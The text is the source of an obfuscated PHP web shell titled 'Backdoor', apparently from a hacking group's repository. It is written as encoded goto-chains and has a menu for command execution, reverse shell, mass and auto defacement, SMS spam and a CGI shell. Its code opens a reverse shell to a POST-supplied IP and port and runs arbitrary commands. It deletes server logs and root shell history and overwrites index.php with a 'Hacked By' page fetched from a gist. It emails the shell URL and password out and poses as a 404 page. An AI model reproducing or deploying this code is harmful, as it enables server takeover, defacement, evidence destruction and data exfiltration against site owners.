     yfJB6: ux4Pj("\105\122\122\117\122\72\40\x53\x68\x65\x6c\154\40\x70\162\x6f\x63\x65\x73\163\40\x74\145\x72\155\151\x6e\x61\x74\x65\144");
     goto acpcj;
     fnlVr: T5NcQ: goto NeM_K;
     hixi0: UX4PJ("\x45\122\x52\117\x52\x3a\40\103\x61\156\47\164\40\163\160\141\167\156\x20\x73\x68\x65\154\154");
     goto Pqa76;
     hYpTp: sGFej: goto IZ42c;
     DCwvK: MEwtL: goto fpiy6;
     DSE52: vtgqz: goto zAr8Q;
     Sr6dw: exit(1);
     goto fnlVr;
     HHTlE: goto EiPhq;
     goto ubmAe;
     Rio3t: if (!$debug) {
         goto Gerk7;
     }
     goto aoY0j;
     u8be6: goto nH59i;
     goto i4WYN;
     lgcUM: sdkbx: goto kdvhl;
     w_eb_: $input = fread($pipes[2], $chunk_size);
     goto MCrGV;
     uxrYt: uX4Pj("\x45\x52\x52\x4f\122\72\x20\123\x68\145\x6c\x6c\40\143\x6f\156\156\145\x63\164\x69\157\x6e\40\164\x65\162\155\151\x6e\141\164\145\x64");
     goto HHTlE;
     QwITV: if (!$debug) {
         goto jmOl9;
     }
     goto QVhEA;
     Ogtyn: $input = fread($pipes[1], $chunk_size);
     goto Rio3t;
     v7cIP: stream_set_blocking($pipes[2], 0);
     goto h4_ny;
     t6jtM: proc_close($process);
     goto lgcUM;
     aoY0j: Ux4pJ("\123\x54\x44\117\x55\124\x3a\x20{$input}");
     goto K133l;
     wfesc: UX4pJ("\x53\x54\104\117\x55\x54\x20\122\x45\x41\104");
     goto N_dkf;
     TLkda: if (!feof($sock)) {
         goto BOjn4;
     }
     goto uxrYt;
     xyHe8: ux4pJ("\123\x4f\x43\113\x3a\x20{$input}");
     goto U74x2;
     VYdYD: kzHf7: goto bg2sL;
     ozVEN: Ux4pj("\123\x54\x44\105\122\x52\72\40{$input}");
     goto VYdYD;
     Uvy_Q: if (!(O1U31() == -1)) {
         goto T5NcQ;
     }
     goto ivqxt;
     DiGxl: if (!1) {
         goto EiPhq;
     }
     goto TLkda;
     UPYhD: UX4Pj("\105\x52\x52\117\122\72\x20\x43\x61\x6e\47\x74\x20\x66\x6f\162\153");
     goto p5SWi;
     km4U9: $ip = $_POST["\151\x70"];
     goto o7dsZ;
     aa_6I: fwrite($sock, $input);
     goto iaPNR;
     bg2sL: fwrite($sock, $input);
     goto Kz71S;
     FcilR: chdir("\57");
     goto CoauX;
     fpiy6: if (!in_array($pipes[1], $read_a)) {
         goto zAEGj;
     }
     goto whJ9k;
     d5CVl: $read_a = array($sock, $pipes[1], $pipes[2]);
     goto X0CGF;
     whJ9k: if (!$debug) {
         goto kmVYk;
     }
     goto wfesc;
     zAr8Q: stream_set_blocking($pipes[0], 0);
     goto N_aOB;
     ubmAe: BOjn4: goto CXiR0;
     DSXR3: $pid = IfKDF();
     goto yoop2;
     oEO7l: U5lzq: goto d5CVl;
     ivqxt: uX4PJ("\105\162\162\157\x72\72\x20\103\x61\x6e\47\x74\x20\163\x65\x74\163\151\144\50\51");
     goto Sr6dw;
     qjLD6: exit(1);
     goto VtCA8;
     o7dsZ: $port = $_POST["\160\157\162\164"];
     goto KCXam;
     V4hTm: goto sdkbx;
     goto hYpTp;
     B_9xj: if (function_exists("\151\x66\x6b\x64\146")) {
         goto sXKoz;
     }
     goto ADL1R;
     kdvhl:
 } goto T3NUU; P5p0o: if ($_GET["\x64\157"] == "\143\157\x6e\x66\x69\147") {
     goto OExGh;
 } goto Linvc; eptYg: SpMG1($_GET["\146\x69\154\145\163"]); goto g5XV0; OToAi: if ($_GET["\x64\157"] == "\152\165\155\x70\151\x6e\x67") {
     goto qH8q8;
 } goto P5p0o; AhvnH: if (copy($_FILES["\146\151\x6c\x65"]["\164\x6d\x70\x5f\156\x61\x6d\145"], getcwd() . $sep . $_FILES["\x66\151\154\x65"]["\x6e\x61\155\x65"])) {
     goto cVxIB;
 } goto rA38k; oUttM: function UIeKR()
 {
     goto hmsid;
     krgNl: @T9GAW("\x2f\166\141\162\x2f\x72\x75\156\57\x75\x74\155\160");
     goto sneM1;
     sneM1: @t9gAW("\57\x76\141\162\57\154\157\x67\x73");
     goto apb5X;
     apb5X: @t9gaW("\x2f\x76\141\162\x2f\154\x6f\x67");
     goto OGHTH;
     OGHTH: @T9Gaw("\x2f\166\x61\162\57\141\x64\155");
     goto qYhF3;
     Sic05: @T9gAw("\145\162\162\157\162\137\154\157\147");
     goto A5ppO;
     Q7oXB: lxANx: goto d83M8;
     ELh46: @T9Gaw("\x2f\166\x61\x72\x2f\154\x6f\x67\57\x77\x74\155\160");
     goto MDZUd;
     d83M8: @t9GAw("\x2e\x63\157\156\146\x69\147");
     goto k8SzY;
     Uxi6c: jjIxG("\x4c\157\147\x73\40\151\163\40\143\x6c\145\141\x72");
     goto NDrs9;
     skCe5: foreach (range("\x41", "\132") as $drive) {
         goto jpjRS;
         c2SMB: B8rjw: goto MbXBc;
         jpjRS: @T9GAW($drive . "\72\x5c\x78\x61\x6d\x70\x70\x5c\x61\160\x61\x63\150\x65\134\154\x6f\147\x73\x5c\145\x72\162\x6f\x72\56\154\157\147");
         goto QINQJ;
         QINQJ: @t9gAW($drive . "\x3a\134\x78\x61\x6d\x70\160\134\141\160\x61\143\x68\145\134\154\x6f\x67\x73\134\141\x63\143\x65\x73\x73\x2e\x6c\157\x67");
         goto c2SMB;
         MbXBc:
     }
     goto Q7oXB;
     A5ppO: CIi80: goto Uxi6c;
     z6mLC: @t9Gaw("\57\x76\141\x72\x2f\x61\160\141\143\150\x65\x2f\x6c\x6f\x67");
     goto krgNl;
     k8SzY: goto CIi80;
     goto ZlYyz;
     bZFBQ: @t9gAw("\57\165\163\x72\x2f\154\x6f\x63\x61\154\57\141\x70\x61\143\150\x65\x2f\x6c\x6f\147");
     goto zUPhI;
     I5Kuh: @T9gAW("\x2f\x72\x6f\157\x74\x2f\56\x62\141\163\x68\137\x68\x69\x73\x74\x6f\162\x79");
     goto tvLA8;
     jBL66: @t9GaW("\57\145\164\x63\x2f\165\x74\x6d\160");
     goto Z5TxT;
     hmsid: global $os;
     goto mXtLh;
     MDZUd: @t9GAW("\56\x63\x6f\156\146\x69\x67");
     goto Sic05;
     tvLA8: @T9GAw("\x2f\x72\157\x6f\164\x2f\56\x62\141\x73\x68\x5f\154\157\147\x6f\x75\x74");
     goto G86Ut;
     Z5TxT: @T9GAw("\x2f\166\x61\x72\x2f\154\x6f\x67\x2f\x6c\x61\163\x74\x6c\x6f\x67");
     goto ELh46;
     zUPhI: @t9gAw("\57\166\141\162\57\141\x70\141\143\150\145\57\x6c\x6f\147\x73");
     goto z6mLC;
     ZlYyz: BDpqJ: goto rFTz2;
     iKHwL: @t9gaw("\57\x72\x6f\x6f\x74\57\56\x6b\163\150\x5f\150\151\163\x74\x6f\x72\171");
     goto I5Kuh;
     G86Ut: @t9GaW("\x2f\165\163\x72\57\154\x6f\x63\141\154\57\141\x70\x61\143\x68\x65\57\x6c\157\x67\163");
     goto bZFBQ;
     qYhF3: @t9gaw("\57\145\164\x63\x2f\167\164\155\160");
     goto jBL66;
     mXtLh: if ($os == "\114\151\156\165\170") {
         goto BDpqJ;
     }
     goto skCe5;
     rFTz2: @t9gAW("\x2f\x74\155\160\57\154\157\147\x73");
     goto iKHwL;
     NDrs9:
 } goto rgZdR; s63LX: w41X1: goto v0HnU; kWim3: exit; goto PoQ0Q; uZ0y4: vL5pr: goto UQWtE; lALpc: goto Jkk29; goto WdooI; tUoBK: if ($_GET["\144\157"] == "\x63\x67\x69") {
     goto zV8YQ;
 } goto Kk0wn; CHviX: if ($_GET["\144\157"] == "\x63\155\144") {
     goto UdMDI;
 } goto haBwC; bB4u4: goto Jkk29; goto qmWpE; buNrn: goto Jkk29; goto ANdEW; Kk0wn: if ($_GET["\144\x6f"] == "\x64\145\x66\x61\x63\145") {
     goto zBGpp;
 } goto v33r3; PoQ0Q: vdcmX: goto q3ebb; d3Ydz: ?>
<!DOCTYPE html>
<html>
<head>
	<title>Backdoor</title>
	<!-- CSS STYLE-->
	<meta charset="utf-8" />
	<meta http-equiv="X-UA-Compatible" content="IE=edge" />
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<link rel="shortcut icon" href="https://cvar1984.github.io/favicon.png" />
	<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet" />
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js" type="text/javascript"></script>
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" type="text/javascript"></script>
	<style type='text/css'>
	body {
		background: black;
		color: lavender;
		text-shadow: 2px 2px 4px #000000;
		background: url(https://cvar1984.github.io/bg-2.jpg) no-repeat center center fixed;
		-webkit-background-size: cover;
		-moz-background-size: cover;
		-o-background-size: cover;
		background-size: cover;
	}

	@font-face {
		font-family: 'Orbitron';
		font-style: normal;
		font-weight: 700;
		src: local('Orbitron Bold'), local('Orbitron-Bold'),
		url(http://fonts.gstatic.com/s/orbitron/v9/yMJWMIlzdpvBhQQL_QIAUjh2qtA.woff2) format('woff2');
		unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6,
		U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193,
		U+2212, U+2215, U+FEFF, U+FFFD;
	}

	li {
		display: inline;
		text-shadow: 2px 2px 4px #000000;
		font-size: 17px;
	}

	a {
		color: lime;
	}

	a:hover {
		color: black;
	}

	table,
	tr,
	td {
		border: 1px;
		-webkit-border: 1px;
		-moz-border: 1px;
		-o-border: 1px;
	}

	table {
		-webkit-width:800px;
		-moz-width:800px;
		-o-width:800px;
		-webkit-height:auto;
		-moz-height:auto;
		-o-height:auto;
		width:800px;
		height:auto;
	}

	nav {

	}

	.table-hover {
		border: 1px solid green;
		cellpadding: 3;
		cellspacing: 3;
		font-size: 15px;
	}

	#textarea {
		background: url(https://cvar1984.github.io/textarea-bg.jpg) no-repeat center center fixed;
		-webkit-background-size: cover;
		-moz-background-size: cover;
		-o-background-size: cover;
		background-size: cover;
		width: 1066px;
		height: 500px;
		font-family: Arial, Helvetica, monospace;
		color: lavender;
		border: 1px solid lime;
	}

	#input {
		background: transparent;
		width: 250px;
		font-family: Arial, Helvetica, monospace;
		color: lavender;
		border: 1px solid lime;
	}

	#menu {}

	* {
		font-family: 'Orbitron';
	}

	.icon {
		width: 20px;
		height: 20px;
	}
	.iframe {
		-webkit-width: 100vw;
		-moz-width: 100vw;
		-o-width: 100vw;
		width: 100vw;
		height: 100vh;
		position: relative;
	}
	span {
		color:red;
	}
	</style>
</head>
<body>
<?php  goto xqfOY; xD83Z: A4P0T(); goto prBdu; s08OF: function uHcbw()
 {
     goto Qffdx;
     Timcq: RMs_m: goto xbnuI;
     CvLGg: PoF8r: goto KeWoN;
     wOdOQ: jjIxG("\151\156\x64\145\170\x2e\160\x68\x70\40\x44\145\x66\x61\x63\x65\x64");
     goto Timcq;
     xU8IC: $file = str_replace("\x4a\165\x73\x74\x20\x4a\157\x6b\145\40\x3a\x76", $_POST["\x61\x6c\x65\162\164"], $file);
     goto YluzR;
     Z7RC6: if (file_exists("\151\x6e\x64\145\x78\x2e\160\150\160")) {
         goto uvDjW;
     }
     goto rON0Z;
     njm5E: ?>
<center><h2>Auto Deface With Backup</h2></center>
<form method='post'>
	<table align="center">
		<tr>
			<td>Title</td> <td>:</td>
			<td><input type='text' class='input-sm' id='input' value='Hacked By Cvar1984' name='title'></td>
			</tr>
		<tr>
			<td>Alert Message</td> <td>:</td> 
			<td><input type='text' class='input-sm' id='input' value='Just Joke :v' name='alert'></td>
			</tr>
		<tr>
			<td>Music Link</td> <td>:</td> 
			<td><input type='text' class='input-sm' id='input' value='https://cvar1984.github.io/bg.mp3' name='music'></td>
			</tr>
		<tr>
			<td>Image Link</td> <td>:</td> 
			<td><input type='text' class='input-sm' id='input' value='https://cvar1984.github.io/logo.png' name='images'></td>
			</tr>
		<tr>
			<td>Content</td> <td>:</td>
			<td><input type='text' class='input-sm' id='input' value='Hacked By Cvar1984' name='content'></td>
			</tr>
		<tr>
			<td>Sub Content</td> <td>:</td>
			<td><input type='text' class='input-sm' id='input' value='This Pain Is Wonderful' name='sub_content'></td>
			</tr>
		</table>
		<center>
			<br /><input type='submit' class='btn btn-danger' name='action' value='Deface'>
		</center>
</form>
	<?php  goto noiJ8;
     BKRdV: goto gHwL8;
     goto m_eBL;
     noiJ8: die;
     goto AfVFV;
     vkuQQ: if (!file_put_contents("\151\156\144\145\x78\x2e\160\x68\x70", $file)) {
         goto RMs_m;
     }
     goto wOdOQ;
     kXth9: chmod("\x69\156\144\145\x78\56\160\x68\x70\x2e\142\141\153", "\x30\x34\x34\64");
     goto vkuQQ;
     Zu9DK: $file = str_replace("\74\150\61\x3e\110\x61\143\153\x65\144\x20\102\x79\x20\x43\x76\x61\162\x31\x39\70\x34\74\x2f\x68\61\76", "\x3c\150\61\76" . $_POST["\143\x6f\x6e\164\x65\156\x74"] . "\x3c\x2f\150\x31\x3e", $file);
     goto f8ui7;
     QUDth: if (!file_put_contents("\x69\x6e\x64\x65\x78\x2e\160\x68\x70", $file)) {
         goto EP_0f;
     }
     goto O5tAE;
     O5tAE: JJiXG("\151\x6e\x64\x65\170\x2e\x70\150\160\x20\104\x65\x66\141\143\x65\144");
     goto znHhG;
     xbnuI: goto gHwL8;
     goto CvLGg;
     f8ui7: $file = str_replace("\x3c\150\64\76\124\x68\x69\x73\40\x50\141\151\156\40\111\x73\x20\x57\x6f\156\x64\x65\x72\x66\x75\x6c\74\x2f\150\64\x3e", "\x3c\150\x34\76" . $_POST["\163\x75\x62\x5f\143\x6f\156\164\145\156\x74"] . "\74\57\150\64\x3e", $file);
     goto Z7RC6;
     rzEjr: IEUze: goto p3_3m;
     O1tJA: $file = str_replace("\x3c\164\151\x74\x6c\x65\76\110\141\143\x6b\x65\x64\40\x42\171\x20\103\x76\141\x72\x31\x39\70\x34\x3c\x2f\x74\x69\x74\x6c\x65\x3e", "\x3c\164\x69\x74\x6c\x65\x3e" . $_POST["\x74\x69\x74\154\x65"] . "\74\x2f\x74\x69\x74\x6c\145\x3e", $file);
     goto K2nMX;
     p3_3m: gHwL8: goto pk0A6;
     YluzR: $file = str_replace("\150\164\164\160\x73\72\x2f\57\x6d\x69\x6e\x65\162\x76\141\x67\x75\x6e\x63\145\154\x65\x72\x69\56\x66\x69\154\145\163\56\167\157\162\144\x70\x72\145\163\163\x2e\143\x6f\x6d\x2f\x32\x30\61\64\57\60\x38\57\154\x6f\147\157\x2e\160\x6e\147", $_POST["\151\155\141\x67\x65\x73"], $file);
     goto Zu9DK;
     wM7NK: if (!file_put_contents("\x69\x6e\x64\145\170\56\150\x74\x6d\x6c", $file)) {
         goto IEUze;
     }
     goto tLaAa;
     K2nMX: $file = str_replace("\150\164\164\160\163\x3a\57\57\143\x76\141\x72\x31\x39\x38\64\x2e\x67\x69\164\150\x75\142\x2e\x69\x6f\x2f\142\x67\56\x6d\x70\63", $_POST["\x6d\165\x73\x69\143"], $file);
     goto xU8IC;
     drh5w: rename("\x69\x6e\x64\x65\170\x2e\x70\150\160", "\151\156\x64\145\170\x2e\160\150\x70\x2e\x62\x61\x6b");
     goto kXth9;
     m_eBL: uvDjW: goto drh5w;
     TKbmP: chmod("\x69\x6e\144\145\x78\56\150\x74\x6d\x6c\x2e\x62\x61\x6b", "\60\x34\x34\x34");
     goto wM7NK;
     tLaAa: jjIxg("\151\x6e\144\x65\170\56\x68\164\x6d\154\x20\x44\145\x66\x61\143\x65\x64");
     goto rzEjr;
     pk0A6: h4B8O: goto njm5E;
     Qffdx: if (!isset($_POST["\141\x63\x74\151\157\x6e"])) {
         goto h4B8O;
     }
     goto Ycw7z;
     Ycw7z: $file = file_get_contents("\150\x74\x74\160\163\x3a\57\57\x67\151\163\164\x2e\x67\151\x74\x68\165\x62\165\x73\x65\162\143\x6f\x6e\164\145\x6e\164\56\x63\x6f\155\x2f\103\166\x61\x72\x31\71\x38\x34\x2f\63\142\146\x64\144\x38\x64\x32\143\x30\x39\x66\x38\70\70\x39\x34\x34\x30\141\x39\146\67\x34\146\x36\61\x31\64\141\60\x34\57\x72\x61\167\x2f\70\71\x39\65\x30\x38\144\x38\60\x65\143\67\x65\142\x61\x35\67\63\x62\x66\x62\x39\61\x61\146\60\70\x32\x35\70\x36\x65\x32\x36\x62\x66\67\x31\145\64\x2f\151\156\144\x65\170\56\160\150\160");
     goto O1tJA;
     rON0Z: if (file_exists("\x69\x6e\x64\145\x78\56\150\x74\x6d\x6c")) {
         goto PoF8r;
     }
     goto QUDth;
     KeWoN: rename("\151\x6e\x64\x65\170\56\150\x74\155\x6c", "\x69\x6e\144\145\170\56\150\164\155\154\x2e\x62\x61\x6b");
     goto TKbmP;
     znHhG: EP_0f: goto BKRdV;
     AfVFV:
 } goto pxJ_h; q1mxz: IIev0: goto eVXgr; mMTy_: goto Jkk29; goto bM1qs; f8uYC: goto Jkk29; goto JdLdN; qdGnG: @mail($email, "\114\x6f\x67\x73", $content_mail, "\x46\162\157\x6d\72\103\x76\141\x72\x31\71\70\64"); goto n4U_N; XHZO8: goto Jkk29; goto v1c6o; pDr2s: $dir = scandir(getcwd()); goto SmrFX; v1c6o: kJyiJ: goto m8Vl9; wxaII: if ($_GET["\x64\x6f"] == "\x64\x65\154\x65\x74\x65" and isset($_GET["\146\x69\x6c\145\x73"])) {
     goto q7lM0;
 } goto lYqT1; rA38k: JjiXg("\125\x70\x6c\157\141\144\40\106\x61\x69\x6c\145\x64"); goto L1bpu; bBZU9: function glsbx()
 {
     goto M4ksq;
     qCvTp: if (!isset($_POST["\143\157\155\x6d\x61\156\x64"])) {
         goto xIkZC;
     }
     goto u_LzW;
     WrGHP: ?>
<center>
		<form method="post">
			<input type="text" class='input-sm' id='input' name="command" /> <input
				type="submit" class="btn btn-danger" />
		</form>
	</center>
	<form></form>
<?php  goto X5M8A;
     u_LzW: echo "\74\143\145\156\164\145\x72\x3e\74\x74\x65\170\x74\141\162\145\x61\40\x69\144\x3d\x27\164\145\170\x74\141\x72\x65\141\47\x20\143\154\x61\x73\x73\x3d\47\x66\157\162\155\55\143\157\x6e\164\162\157\x6c\x27\x20\x72\x65\x61\144\x6f\x6e\154\171\76" . U4tUx($_POST["\x63\x6f\155\x6d\x61\x6e\144"]) . "\x3c\x2f\x74\x65\x78\164\x61\x72\145\x61\76\74\x2f\x63\x65\x6e\164\x65\162\x3e";
     goto MezQW;
     X5M8A: die;
     goto NkcVE;
     MezQW: xIkZC: goto WrGHP;
     M4ksq: echo "\74\x63\145\x6e\164\x65\162\x3e\74\150\x32\x3e\x43\x6f\x6d\x6d\x61\156\x64\x20\120\x72\157\x6d\160\164\x3c\x2f\150\x32\76\x3c\57\x63\x65\156\164\x65\162\x3e";
     goto qCvTp;
     NkcVE:
 } goto d940G; Dn0ba: TnBrl(); goto G7bgQ; neAj8: chdir($dir); goto FZCUK; wb8wZ: $sep = "\x2f"; goto zknN1; pGXIU: pQmVw: goto BV3jv; DdRy8: VZy1Y($_GET["\x64\151\162"]); goto VGEHJ; vQ3dI: M4L6u(); goto buNrn; nLbsJ: if (!function_exists("\146\151\154\145\137\160\165\164\x5f\x63\157\156\164\x65\156\x74\163")) {
     echo "\74\163\x63\x72\x69\160\164\x3e\x61\x6c\145\162\164\50\x27\x66\x69\x6c\x65\137\160\165\164\137\x63\x6f\156\164\x65\x6e\x74\x73\40\146\x75\156\x63\164\x69\x6f\156\x20\144\151\163\141\x62\x6c\x65\144\54\40\x74\x68\x69\163\40\167\145\x62\163\150\145\x6c\154\40\x6e\x6f\164\x20\167\157\162\153\x69\156\147\x20\x70\162\157\160\x65\x72\x6c\171\47\x29\74\57\163\x63\162\x69\x70\164\x3e";
 } goto YeyTs; v33r3: if ($_GET["\144\x6f"] == "\x73\150\157\x72\164\x6c\x69\x6e\153") {
     goto kX6ei;
 } goto IxX6P; AmxkD: jjiXg("\x55\x70\154\157\x61\x64\40\123\x75\x63\x63\145\x73\163"); goto gRcNX; lTD8w: if ($_GET["\144\157"] == "\x6e\145\x74\167\157\x72\x6b") {
     goto uWVJj;
 } goto mMTy_; WdooI: t30L2: goto Eft_I; aZCmH: Ve1hM: goto jyqm9; tsNUj: UHcBW(); goto E_3T1; cxDMj: function VzY1Y($dir)
 {
     goto w2sdb;
     jXHBz: goto dDIz5;
     goto MCuMY;
     NXgDP: jjIXg("\123\165\x63\x63\x65\163\x73");
     goto qdGEw;
     w2sdb: if (@mkdir($dir . "\x2f" . "\x6e\x65\x77\137\144\x69\162")) {
         goto WTq_G;
     }
     goto oZgmR;
     MCuMY: WTq_G: goto NXgDP;
     oZgmR: JjIxg("\120\145\x72\x6d\151\163\163\151\157\156\40\104\145\x6e\x69\x65\x64\x20\x4f\x72\40\x46\x69\x6c\x65\40\x45\170\151\x73\x74\163");
     goto jXHBz;
     qdGEw: dDIz5: goto IHEUJ;
     IHEUJ:
 } goto upQzj; wi8wr: uWVJj: goto ctUzc; VHd9t: goto XGeZ9; goto q1mxz; haBwC: if ($_GET["\144\157"] == "\154\x6f\147\x73") {
     goto Ve1hM;
 } goto tUoBK; NQAe_: $_SESSION[sha1(md5($_SERVER["\x48\124\x54\x50\x5f\x48\x4f\x53\124"]))] = true; goto BZ_hd; BWB1O: if ($_GET["\x64\157"] == "\164\157\165\x63\x68" and isset($_GET["\146\x69\154\x65\x73"])) {
     goto w41X1;
 } goto lTD8w; aux2O: gYzgO(); goto bB4u4; Fhp6L: L1ZR1(); goto GJDO7; ctUzc: HNMnj(); goto ThQCb; YeyTs: $shell_path = $content_mail = "\x55\x52\x4c\40\72\x20\150\x74\164\x70\x3a\x2f\x2f" . $_SERVER["\123\x45\x52\x56\105\x52\x5f\116\x41\115\105"] . $_SERVER["\122\x45\x51\125\105\123\124\137\125\122\111"] . "\12\12\111\x50\40\72\x20" . $_SERVER["\x52\x45\115\x4f\x54\x45\x5f\101\104\104\x52"] . "\12\12\120\x61\x73\163\x77\157\x72\144\40\x3a\40" . $auth_pass . "\12\xa\x42\x79\40\x43\x76\x61\162\61\x39\70\x34"; goto Sp_ot; bn54s: function K3j3z()
 {
     goto wzIkj;
     gTkcD: exit;
     goto soEyj;
     rOmAV: echo $_SERVER["\120\x48\120\137\123\x45\x4c\106"];
     goto N4JS1;
     N4JS1: ?> was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<?php  goto gTkcD;
     wzIkj: ?>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL <?php  goto rOmAV;
     soEyj:
 } goto JfUXZ; JdLdN: OExGh: goto vQ3dI; FZCUK: goto Jkk29; goto Hz6Gx; d_edT: YccVm(); goto lALpc; KXAl7: function UEqDa($filename)
 {
     goto QDMVj;
     RbMM9: nizoE: goto wi1jx;
     j48C1: die;
     goto unN1f;
     jD5Mo: goto nizoE;
     goto UCRmK;
     UCRmK: d3Rpm: goto ni7xo;
     Q0ZX0: U0rbo: goto LSHZo;
     wi1jx: tnBRL();
     goto Q0ZX0;
     LSHZo: ?>
   <form method='post'>
		<center>
			<td>Permission : <input type='text' class='input-sm' id='input'
				value='0755' name='permission'></td> <input type='submit'
				class='btn btn-danger' name='action' value='chmod'>
		</center>
	</form>
	<?php  goto j48C1;
     zUEaS: if (chmod($filename, $_POST["\160\145\162\x6d\x69\x73\x73\151\157\x6e"])) {
         goto d3Rpm;
     }
     goto UZgRY;
     ni7xo: JJixG("\x53\165\143\x63\x65\163\x73");
     goto RbMM9;
     UZgRY: JjiXG("\x50\145\162\x6d\x69\x73\163\x69\x6f\156\40\104\x65\x6e\x69\145\144");
     goto jD5Mo;
     QDMVj: if (!isset($_POST["\141\143\164\x69\157\156"])) {
         goto U0rbo;
     }
     goto zUEaS;
     unN1f:
 } goto oUttM; Db0q_: XGeZ9: goto kN_m_; GJDO7: goto Jkk29; goto GS__n; zknN1: $os = "\x4c\151\156\165\x78"; goto s5SwB; DgSHm: c5S6g(); goto f8uYC; GS__n: zBGpp: goto tsNUj; m8Vl9: $dir = $_GET["\x64\x69\162"]; goto neAj8; tVkjr: kX6ei: goto xD83Z; q3ebb: S1ihE: goto bn54s; nENXh: Jjanc($_GET["\146\151\x6c\145\163"]); goto YVxpL; yTS4n: function Spmg1($filename)
 {
     jJIxg("\x74\x68\x69\x73\x20\x65\x78\164\x65\x6e\x73\151\157\156\x20\x69\x73\x20\x6e\x6f\x74\40\163\165\160\x70\157\162\x74\x65\x64");
     tNBrL();
 } goto deCzC; Eft_I: xiZFI($_GET["\146\151\154\x65\163"]); goto XHZO8; BV3jv: YqYC7(); goto xtMZ1; E_3T1: goto Jkk29; goto tVkjr; tZReq: header("\x48\124\124\x50\x2f\x31\x2e\x30\x20\64\x30\64\40\116\157\164\x20\x46\157\x75\156\x64"); goto kWim3; iUmx7: qH8q8: goto DgSHm; lsPIc: if (@T9Gaw($_GET["\146\x69\x6c\145\x73"])) {
     goto IIev0;
 } goto wdnHz; T3NUU: ?>
<nav class="navbar navbar-inverse">
	<div class="container-fluid">
		<div class="navbar-header">
			<a class="navbar-brand" href="https://github.com/BlackHoleSecurity/backdoor">Tuzki</a>
		</div>
		<ul class="nav navbar-nav">
			<li class="active"><a href="?">Home</a></li>
			<li class="dropdown"><a class="dropdown-toggle" data-toggle="dropdown" href="#">Tools <span class="caret"></span></a>
				<ul class="dropdown-menu">
					<li><a href='?do=cmd'><span class="glyphicon glyphicon-list-alt"></span> Command Prompt</a></li>
					<li><a href='?do=sms'><span class="glyphicon glyphicon-envelope"></span> Spam SMS</a></li>
					<li><a href='?do=music'><span class="glyphicon glyphicon-headphones"></span> Music</a></li>
					<li><a href='?do=jumping'><span class="glyphicon glyphicon-transfer"></span> Jumping</a></li>
					<li><a href='?do=config'><span class="glyphicon glyphicon-wrench"></span> Config</a></li>
					<li><a href='?do=mass_deface'><span class="glyphicon glyphicon-random"></span> Mass Deface</a></li>
					<li><a href='?do=info'><span class="glyphicon glyphicon-info-sign"></span> Server Info</a></li>
					<li><a href='?do=logs'><span class="glyphicon glyphicon-retweet"></span> Clear Logs</a></li>
					<li><a href='?do=cgi'><span class="glyphicon glyphicon-duplicate"></span> CGI Shell</a></li>
					<li><a href='?do=deface'><span class="glyphicon glyphicon-user"></span> Auto Deface</a></li>
					<li><a href='?do=shortlink'><span class="glyphicon glyphicon-link"></span> Shortlink Generator</a></li>
					<li><a href='?do=network'><span class="glyphicon glyphicon-globe"></span> Network</a></li>
				</ul>
			</li>
			<li><a href='?do=logout'><span class="glyphicon glyphicon-off"></span> Logout</a></li>
		</ul>
	</div>
</nav>
<?php  goto pwCJW; OI4ds: echo date("\x59"); goto QjL6a; prBdu: goto Jkk29; goto lXYhF; YRYYO: function yqYc7()
 {
     goto jqEUs;
     jqEUs: echo "\x3c\143\145\x6e\x74\145\x72\x3e";
     goto T3c8A;
     It7HB: die;
     goto IlAPv;
     T3c8A: echo "\74\151\x66\162\141\x6d\x65\40\167\x69\x64\x74\150\x3d\x27\x37\60\60\160\170\x27\x20\x68\145\x69\147\x68\x74\75\47\65\60\x30\160\x78\x27\x20\163\143\x72\x6f\x6c\x6c\151\x6e\x67\75\47\x6e\157\x27\x20\x66\162\141\x6d\145\x62\x6f\x72\x64\145\162\x3d\47\156\157\47\40\x73\162\143\x3d\x27\150\x74\x74\x70\x73\72\57\x2f\167\56\x73\x6f\x75\156\x64\x63\x6c\157\165\144\x2e\x63\x6f\x6d\x2f\160\154\141\x79\145\162\57\77\x75\162\x6c\x3d\150\x74\164\x70\x73\x3a\x2f\57\141\x70\151\56\163\x6f\x75\x6e\x64\x63\x6c\157\165\144\x2e\143\157\155\57\160\x6c\141\x79\x6c\151\163\x74\163\x2f\x33\x35\x35\x38\x37\x34\71\x31\61\46\x61\155\160\x3b\143\x6f\154\157\x72\75\x23\60\x30\143\x63\x31\61\x26\x61\x6d\x70\73\x61\x75\164\x6f\137\160\x6c\141\x79\x3d\x74\x72\x75\x65\46\141\155\160\73\x68\x69\x64\x65\x5f\x72\x65\x6c\141\x74\145\144\75\146\x61\x6c\x73\x65\46\141\x6d\160\73\163\150\x6f\x77\x5f\x63\x6f\x6d\x6d\x65\x6e\x74\x73\x3d\x74\x72\x75\145\x26\141\155\160\73\163\150\x6f\x77\x5f\165\x73\x65\x72\75\x74\162\x75\x65\x26\x61\x6d\160\x3b\x73\150\157\167\137\162\145\x70\157\x73\164\x73\x3d\x66\141\x6c\x73\x65\x26\141\155\160\x3b\163\150\x6f\167\x5f\164\x65\x61\163\x65\x72\75\164\x72\165\145\x26\141\155\x70\x3b\x76\x69\163\x75\141\x6c\x3d\164\x72\x75\x65\47\x3e\74\57\151\146\x72\x61\155\145\x3e";
     goto q5pHX;
     q5pHX: echo "\x3c\x2f\x63\x65\156\x74\145\x72\76";
     goto It7HB;
     IlAPv:
 } goto XyLTN; OMq5A: goto Jkk29; goto pGXIU; zNXEM: if ($_GET["\x64\x6f"] == "\150\157\x6d\x65") {
     goto Guyes;
 } goto fP0qQ; Vw1Hz: if ($_GET["\144\x6f"] == "\x6d\165\163\151\x63") {
     goto pQmVw;
 } goto OToAi; jyqm9: UIEKr(); goto g8_oj; caYUZ: function JjixG($message)
 {
     goto cemld;
     ONmgf: echo "\x27" . $message . "\47";
     goto terM6;
     cemld: ?>
<script type="text/javascript">
var ALERT_TITLE = "Alert";
var ALERT_BUTTON_TEXT = "Ok";
if (document.getElementById) {
	window.alert = function(txt) {
		createCustomAlert(txt);
	}
}

function createCustomAlert(txt) {
